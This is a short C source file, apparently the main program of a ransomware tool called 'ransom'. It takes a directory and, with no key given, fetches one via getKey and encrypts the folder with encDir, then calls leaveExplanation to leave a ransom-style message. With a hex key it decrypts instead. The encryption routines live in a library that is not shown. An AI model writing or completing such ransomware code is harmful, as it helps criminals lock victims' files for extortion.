#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "src/libcom.h"

void usage() {
	printf("Usage : ./ransom <file> <key in hex if decrypt>\n");
}

// set depending on if the key is given or not (decrypt or encrypt)
int ENCRYPT = 1;

int main (int argc, char **argv){
	// if less than one argument then show usage and exit
	if (argc < 2) {
		usage();
		return 0;
	}
	int ID = 0;
	// if two args then the key equ that second arg
	char* key = 0;
	if(argc == 3){
		ENCRYPT = 0;
		key = malloc(LENGTH);
		char *hex_key = argv[2];
		hexa_to_bytes(hex_key, (unsigned char*)key, LENGTH);
	}
	else{
		key = getKey(ID);
	}
	// encrypt the folder
	encDir(argv[1], key);
	free(key);
	// leave a message to the user
	if(ENCRYPT == 1) leaveExplanation();
	return 0;
}
